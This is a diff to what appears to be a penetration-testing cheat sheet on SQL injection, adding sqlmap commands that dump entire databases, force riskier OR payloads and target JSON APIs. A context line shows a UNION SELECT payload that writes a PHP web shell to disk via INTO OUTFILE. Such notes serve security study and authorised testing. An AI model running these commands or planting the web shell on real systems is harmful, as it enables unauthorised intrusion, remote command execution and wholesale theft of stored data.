@@ -390,8 +390,10 @@ cn') UNION SELECT "", '<?php system($_REQUEST[0]); ?>',"","" into outfile '/var/
 ## SQLMap
 
 ```bash
-# Run SQLMap without asking for user input
-sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
+sqlmap -hh
+
+# Run SQLMap without asking for user input. Use `--dump` to dump ALL data!
+sqlmap -u "http://www.example.com/vuln.php?id=1" --batch --dump
 
 # In webpage, copy GET request as cURL > paste and replace `curl` with `sqlmap` > use `--crawl`, `--forms`, `-g` for specilized options
 sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1' --crawl --forms -g
@@ -399,7 +401,7 @@ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; 
 # SQLMap with POST request specifying an injection point with asterisk
 sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
 
-# Passing an HTTP request file to SQLMap. Can specify injection point within the txt file with asterisk (e.g. `/?id=*`)
+# Passing an HTTP request file to SQLMap. Can specify injection point within the txt file with asterisk (e.g. `/?id=*`). Can use sqlmap with APIs as sqlmap can read JSON as well!
 sqlmap -r req.txt
 
 # Specifying a Cookie Header
@@ -410,6 +412,9 @@ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
 
 # Specifying a PUT request
 sqlmap -u www.target.com --data='id=1' --method PUT
+
+# Force sqlmap to use `OR` payloads
+sqlmap -r req.txt --batch --dump --risk=3
 
 # Specifying a prefix or suffix
 sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
